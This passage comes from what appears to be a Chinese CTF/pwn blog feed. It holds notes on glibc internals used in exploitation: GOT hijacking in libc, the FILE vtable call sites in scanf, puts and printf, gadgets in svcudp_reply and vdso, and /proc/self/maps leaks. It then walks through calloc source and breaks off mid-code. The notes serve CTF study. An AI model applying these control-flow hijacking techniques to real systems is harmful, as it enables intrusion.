时，程序会立即终止，<strong>不会执行任何清理操作</strong>，如不刷新I/O缓冲区、不调用注册的退出函数等。</li><li>这个函数通常在需要立即终止程序，而不关心清理资源或数据的完整性时使用，例如，在子进程中避免复制父进程的缓冲区。</li></ul></li></ol><h2 id="so的got表"><a href="#so的got表" class="headerlink" title="so的got表"></a>so的got表</h2><p>checksec可以发现libc和ld的RELRO保护都是Partial RELRO</p><p>且ida打开可以观察到其中确实有.got.plt表,里面有不少函数</p><p>这就意味着如果能够修改so的got表也能做到劫持流</p><h2 id="常见IO函数触发vtable调用的位置"><a href="#常见IO函数触发vtable调用的位置" class="headerlink" title="常见IO函数触发vtable调用的位置"></a>常见IO函数触发vtable调用的位置</h2><p>有些时候程序不能或者很难满足下列三个条件</p><ol><li>通过exit退出</li><li>main能返回</li><li>触发__malloc_assert</li></ol><p>那么利用伪造的chunk触发vtable调用,显然并不容易做到,</p><p>这种情况下可以考虑通过stdin,stdout来触发vtable调用</p><p>这里列出几个常见函数触发vtable调用的位置(只列出现的比较早的)</p><p><strong>注意:</strong></p><p><strong>一般都有两个要求</strong></p><ol><li><strong>是窄字符模式</strong>(_mode&lt;=0)</li><li><strong>_IO_USER_LOCK标志位为0</strong></li></ol><p>且调用时第一个参数rdi一般都是对应FILE结构体指针</p><p>因为各种参数的影响,如果实操与所示结果不同,那么<strong>需要另行调试</strong>并做构造调整</p><h3 id="scanf-amp-amp-gets"><a href="#scanf-amp-amp-gets" class="headerlink" title="scanf&amp;&amp;gets"></a>scanf&amp;&amp;gets</h3><p><strong>scanf和gets调用vtable几乎一致</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e53c92 &lt;+98&gt;:mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">0x00007ffff7e53c99 &lt;+105&gt;:lea    rdx,[rip+0x156c00]        # 0x7ffff7faa8a0 &lt;_IO_helper_jumps&gt;</span><br><span class="line">0x00007ffff7e53ca0 &lt;+112&gt;:lea    rax,[rip+0x157961]        # 0x7ffff7fab608</span><br><span class="line">0x00007ffff7e53ca7 &lt;+119&gt;:sub    rax,rdx</span><br><span class="line">0x00007ffff7e53caa &lt;+122&gt;:mov    rcx,rbx</span><br><span class="line">0x00007ffff7e53cad &lt;+125&gt;:sub    rcx,rdx</span><br><span class="line">0x00007ffff7e53cb0 &lt;+128&gt;:cmp    rax,rcx</span><br><span class="line">0x00007ffff7e53cb3 &lt;+131&gt;:jbe    0x7ffff7e53de0 &lt;__GI___uflow+432&gt;</span><br><span class="line">0x00007ffff7e53cb9 &lt;+137&gt;:mov    rax,QWORD PTR [rbx+0x28]</span><br><span class="line">0x00007ffff7e53cbd &lt;+141&gt;:add    rsp,0x8</span><br><span class="line">0x00007ffff7e53cc1 &lt;+145&gt;:mov    rdi,rbp</span><br><span class="line">0x00007ffff7e53cc4 &lt;+148&gt;:pop    rbx</span><br><span class="line">0x00007ffff7e53cc5 &lt;+149&gt;:pop    rbp</span><br><span class="line">0x00007ffff7e53cc6 &lt;+150&gt;:jmp    rax</span><br></pre></td></tr></table></figure><p>在进入__uflow处,存在一次调用vtable,重点关注</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e53c92 &lt;+98&gt;:mov    rbx,QWORD PTR [rbp+0xd8]</span><br><span class="line">.....</span><br><span class="line">0x00007ffff7e53cb9 &lt;+137&gt;:mov    rax,QWORD PTR [rbx+0x28]</span><br><span class="line">.....</span><br><span class="line">0x00007ffff7e53cc6 &lt;+150&gt;:jmp    rax</span><br></pre></td></tr></table></figure><p>其中rbp是<em>IO_2_1_stdin\</em>,取出了stdin的vtable+0x28并调用</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e53f6e &lt;+30&gt;:mov    rbp,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7e53f75 &lt;+37&gt;:mov    rcx,rbp</span><br><span class="line">   0x00007ffff7e53f78 &lt;+40&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e53f7b &lt;+43&gt;:cmp    rax,rcx</span><br><span class="line">   0x00007ffff7e53f7e &lt;+46&gt;:jbe    0x7ffff7e53fa8 &lt;__GI__IO_default_uflow+88&gt;</span><br><span class="line">   0x00007ffff7e53f80 &lt;+48&gt;:mov    rdi,rbx</span><br><span class="line">=&gt; 0x00007ffff7e53f83 &lt;+51&gt;:call   QWORD PTR [rbp+0x20]</span><br></pre></td></tr></table></figure><p>进入_IO_default_uflow后,取出了stdin的vtable+0x20并调用</p><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e464c7 &lt;+167&gt;:mov    r14,QWORD PTR [rdi+0xd8]</span><br><span class="line">   0x00007ffff7e464ce &lt;+174&gt;:lea    rdx,[rip+0x1643cb]        # 0x7ffff7faa8a0 &lt;_IO_helper_jumps&gt;</span><br><span class="line">   0x00007ffff7e464d5 &lt;+181&gt;:lea    rax,[rip+0x16512c]        # 0x7ffff7fab608</span><br><span class="line">   0x00007ffff7e464dc &lt;+188&gt;:sub    rax,rdx</span><br><span class="line">   0x00007ffff7e464df &lt;+191&gt;:mov    rcx,r14</span><br><span class="line">   0x00007ffff7e464e2 &lt;+194&gt;:sub    rcx,rdx</span><br><span class="line">=&gt; 0x00007ffff7e464e5 &lt;+197&gt;:cmp    rax,rcx</span><br><span class="line">   0x00007ffff7e464e8 &lt;+200&gt;:jbe    0x7ffff7e46580 &lt;__GI__IO_puts+352&gt;</span><br><span class="line">   0x00007ffff7e464ee &lt;+206&gt;:mov    rdx,rbx</span><br><span class="line">   0x00007ffff7e464f1 &lt;+209&gt;:mov    rsi,r12</span><br><span class="line">   0x00007ffff7e464f4 &lt;+212&gt;:call   QWORD PTR [r14+0x38]</span><br></pre></td></tr></table></figure><p>puts主函数很快便会调用vtable+0x38</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   0x00007ffff7e3892a &lt;+202&gt;:mov    rax,QWORD PTR [r12+0xd8]</span><br><span class="line">   0x00007ffff7e38932 &lt;+210&gt;:lea    rcx,[rip+0x172ccf]        # 0x7ffff7fab608</span><br><span class="line">   0x00007ffff7e38939 &lt;+217&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e3893c &lt;+220&gt;:mov    QWORD PTR [rbp-0x4d0],rdx</span><br><span class="line">   0x00007ffff7e38943 &lt;+227&gt;:mov    QWORD PTR [rbp-0x4c8],rcx</span><br><span class="line">   0x00007ffff7e3894a &lt;+234&gt;:mov    rsi,rcx</span><br><span class="line">   0x00007ffff7e3894d &lt;+237&gt;:mov    rcx,rax</span><br><span class="line">   0x00007ffff7e38950 &lt;+240&gt;:sub    rcx,rdx</span><br><span class="line">   0x00007ffff7e38953 &lt;+243&gt;:cmp    rsi,rcx</span><br><span class="line">   0x00007ffff7e38956 &lt;+246&gt;:jbe    0x7ffff7e38d30 &lt;__vfprintf_internal+1232&gt;</span><br><span class="line">   0x00007ffff7e3895c &lt;+252&gt;:mov    r15,QWORD PTR [rbp-0x4b8]</span><br><span class="line">   0x00007ffff7e38963 &lt;+259&gt;:mov    rsi,r13</span><br><span class="line">=&gt; 0x00007ffff7e38966 &lt;+262&gt;:mov    rdi,r12</span><br><span class="line">   0x00007ffff7e38969 &lt;+265&gt;:sub    r15,r13</span><br><span class="line">   0x00007ffff7e3896c &lt;+268&gt;:mov    rdx,r15</span><br><span class="line">   0x00007ffff7e3896f &lt;+271&gt;:call   QWORD PTR [rax+0x38]</span><br></pre></td></tr></table></figure><p>__vfprintf_internal处同样会调用vtable+0x38</p><h3 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h3><p>更多的类似getchar,putchar等io函数可以用相同的办法调试得到</p><h2 id="svcudp-reply"><a href="#svcudp-reply" class="headerlink" title="svcudp_reply"></a>svcudp_reply</h2><p>该函数中存在一个有用的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7f16dea &lt;+26&gt;:mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">0x00007ffff7f16dee &lt;+30&gt;:mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">0x00007ffff7f16df2 &lt;+34&gt;:lea    r13,[rbp+0x10]</span><br><span class="line">0x00007ffff7f16df6 &lt;+38&gt;:mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">0x00007ffff7f16dfd &lt;+45&gt;:mov    rdi,r13</span><br><span class="line">0x00007ffff7f16e00 &lt;+48&gt;:call   QWORD PTR [rax+0x28]</span><br><span class="line">0x00007ffff7f16e03 &lt;+51&gt;:mov    rax,QWORD PTR [rbp+0x8]</span><br></pre></td></tr></table></figure><h1 id="ELF相关"><a href="#ELF相关" class="headerlink" title="ELF相关"></a>ELF相关</h1><h2 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h2><p>elf运行时有时会报错<code>timeout: the monitored command dumped core</code></p><p>一般有两种情况会导致这个报错</p><p><strong>一是栈对齐问题</strong>,函数执行过程中碰到了movaps指令,其操作数未十六进制对齐</p><p>可尝试通过增加ret gadget解决</p><p><strong>二是程序未正常退出</strong></p><p>一般是使返回地址为exit等让程序正常退出的函数地址</p><p><strong>三是超时</strong></p><h2 id="标准流符号"><a href="#标准流符号" class="headerlink" title="标准流符号"></a>标准流符号</h2><p>大多数elf程序的bss段上</p><p>都会存在<code>stdin,stdout,stderr</code>这几个符号中的一两个</p><p>这几个符号在程序开始后都会指向各自对应的在libc中的FILE结构体</p><p>某些情况下可以用其来获得libc或者无输出爆破libc</p><h2 id="elf映射"><a href="#elf映射" class="headerlink" title="elf映射"></a>elf映射</h2><p>elf在映射时<strong>bss段会被映射两次</strong>,可以在gdb中利用search指令查找</p><h2 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h2><p>elf运行时会有内存映射vdso</p><p>dump下来可以发现其中存在一些有用的gadget,例如sycall….,而且与<u>vsyscall</u>中的syscall不能拆分使用不同,这个是可以使用的</p><p>此外在栈上环境变量(environ)之上<u>会保存有vdso的起始地址</u></p><p>一些特殊情况可能用得上</p><h1 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h1><h2 id="open调用"><a href="#open调用" class="headerlink" title="open调用"></a>open调用</h2><p>某次比赛因为open参数的原因折腾了不久,浅浅学一下</p><h3 id="open调用参数"><a href="#open调用参数" class="headerlink" title="open调用参数"></a>open调用参数</h3><h4 id="oflags"><a href="#oflags" class="headerlink" title="oflags"></a>oflags</h4><p>oflags是由诸多bit组成的标志位,各标志的宏如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* File access modes for `open&#x27; and `fcntl&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_RDONLY0<span class="comment">/* Open read-only.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_WRONLY1<span class="comment">/* Open write-only.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_RDWR2<span class="comment">/* Open read/write.  */</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Bits OR&#x27;d into the second argument to open.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_CREAT0x0200<span class="comment">/* Create file if it doesn&#x27;t exist.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_EXCL0x0800<span class="comment">/* Fail if file already exists.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_TRUNC0x0400<span class="comment">/* Truncate file to zero length.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_NOCTTY0x8000<span class="comment">/* Don&#x27;t assign a controlling terminal.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_ASYNC0x0040<span class="comment">/* Send SIGIO to owner when data is ready.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_FSYNC0x0080<span class="comment">/* Synchronous writes.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_SYNCO_FSYNC</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>__USE_MISC</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_SHLOCK0x0010<span class="comment">/* Open with shared file lock.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_EXLOCK0x0020<span class="comment">/* Open with shared exclusive lock.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_XOPEN2K8</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_DIRECTORY0x00200000<span class="comment">/* Must be a directory. */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_NOFOLLOW0x00000100<span class="comment">/* Do not follow links. */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_CLOEXEC0x00400000      <span class="comment">/* Set close_on_exec.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined __USE_POSIX199309 || defined __USE_UNIX98</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_DSYNC0x00010000<span class="comment">/* Synchronize data.  */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_RSYNC0x00020000<span class="comment">/* Synchronize read operations. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* All opens support large file sizes, so there is no flag bit for this.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_LARGEFILE64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_LARGEFILE0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* File status flags for `open&#x27; and `fcntl&#x27;.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_APPEND0x0008<span class="comment">/* Writes append to the file.  */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>O_NONBLOCK0x0004<span class="comment">/* Non-blocking I/O.  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __USE_MISC</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> O_NDELAYO_NONBLOCK</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>常用的有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O_RDONLY：以只读方式打开文件。</span><br><span class="line">O_WRONLY：以只写方式打开文件。</span><br><span class="line">O_RDWR：以读写方式打开文件。</span><br><span class="line">O_CREAT：如果文件不存在，则创建文件。</span><br><span class="line">O_EXCL：与O_CREAT一起使用，用于确保文件的创建是独占的，即如果文件已经存在，则open调用会失败。</span><br><span class="line">O_TRUNC：如果文件已经存在，在打开文件时将其截断为空文件。</span><br><span class="line">O_APPEND：在文件末尾追加数据而不是覆盖已有数据。</span><br><span class="line">O_NONBLOCK：以非阻塞方式打开文件。</span><br></pre></td></tr></table></figure><h4 id="mode"><a href="#mode" class="headerlink" title="mode"></a>mode</h4><p>open系统调用的第三个参数mode是一个无符号整数，用于指定文件的访问权限（仅在创建文件时生效，即当flags中包含O_CREAT时）。</p><p>它定义了文件所有者、所属组和其他用户对文件的读、写和执行权限。</p><p>当oflags没有O_CREAT标志时无意义</p><h3 id="文件标识符上限"><a href="#文件标识符上限" class="headerlink" title="文件标识符上限"></a>文件标识符上限</h3><p>使用open调用打开文件时会分配一个文件标识符</p><p>通常一个进程能够打开的文件标识符数量是有限的</p><p>可以使用<code>ulimit -n</code>查看,一般是1024</p><p>如果超过了这个数字,那么将打开失败,进而导致读取失败</p><p>除去进程自动打开的stdin,stdout,stderr三个文件流的标识符,我们还能再打开1021个标识符</p><p>再多的话就会打开失败</p><p>一个示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">1024</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">  FILE *fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="type">int</span> buf=<span class="number">0</span>;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;%d\n&quot;</span>,i,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="/proc/self/maps"></a>/proc/self/maps</h2><p>每个进程在<code>/proc</code>目录下都存在一个记录该进程信息的文件夹</p><p>命名是<code>/proc/pid</code></p><p>其中有一个maps文本文件,会记载进程的各个段的映射信息</p><p>某些情况下可以利用其泄露一些信息,</p><p>在大多数不知道pid的情况下,只需要进程内引用<code>/proc/self/maps</code>,就会自动指向该进程的对应文件夹</p>]]></content>
      
      
      <categories>
          
          <category> 杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 杂烩 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>calloc&amp;realloc</title>
      <link href="/posts/14246/"/>
      <url>/posts/14246/</url>
      
        <content type="html"><![CDATA[<h1 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h1><p>原型__libc_calloc (size_t n, size_t elem_size)</p><p>开始声明了一堆变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mstate av;</span><br><span class="line">mchunkptr oldtop, p;</span><br><span class="line">INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;</span><br><span class="line"><span class="type">void</span> *mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> clearsize;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nclears;</span><br><span class="line">INTERNAL_SIZE_T *d;</span><br></pre></td></tr></table></figure><p>得到申请大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes = n * elem_size;</span><br></pre></td></tr></table></figure><p>大小检测??</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HALF_INTERNAL_SIZE_T \</span></span><br><span class="line"><span class="meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (elem_size != <span class="number">0</span> &amp;&amp; bytes / elem_size != n)</span><br><span class="line">        &#123;</span><br><span class="line">          __set_errno (ENOMEM);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>hook</strong>,定义一个函数指针,值来自__malloc_hook,不为空则调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">  atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    sz = bytes;</span><br><span class="line">    mem = (*hook)(sz, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memset</span> (mem, <span class="number">0</span>, sz);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一些准备工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sz = bytes;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    av = &amp;main_arena;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    arena_get (av, sz);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (av)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check if we hand out the top chunk, in which case there may be no</span></span><br><span class="line"><span class="comment"> need to clear. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CLEARS</span></span><br><span class="line">      oldtop = top (av);</span><br><span class="line">      oldtopsize = chunksize (top (av));</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> MORECORE_CLEARS &lt; 2</span></span><br><span class="line">      <span class="comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena &amp;&amp;</span><br><span class="line">  oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop)</span><br><span class="line">oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="type">char</span> *) oldtop);</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">&#123;</span><br><span class="line">  heap_info *heap = heap_for_ptr (oldtop);</span><br><span class="line">  <span class="keyword">if</span> (oldtopsize &lt; (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop)</span><br><span class="line">    oldtopsize = (<span class="type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="type">char</span> *) oldtop;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* No usable arenas.  */</span></span><br><span class="line">      oldtop = <span class="number">0</span>;</span><br><span class="line">      oldtopsize = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>核心依然是__int_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mem = _int_malloc (av, sz);</span><br><span class="line"></span><br><span class="line">assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||</span><br><span class="line">        av == arena_for_chunk (mem2chunk (mem)));</span><br></pre></td></tr></table></figure><p>非单线程情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!SINGLE_THREAD_P)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (mem == <span class="number">0</span> &amp;&amp; av != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_calloc_retry, <span class="number">1</span>, sz);</span><br><span class="line">  av = arena_get_retry (av, sz);</span><br><span class="line">  mem = _int_malloc (av, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (av != <span class="literal">NULL</span>)</span><br><span class="line">__libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocation failed even after a retry.  */</span></span><br><span class="line"> <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>成功之后,如果是mmap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two optional cases in which clearing not necessary */</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped (p))</span><br><span class="line">  &#123;</span><br><span class="line">    <span 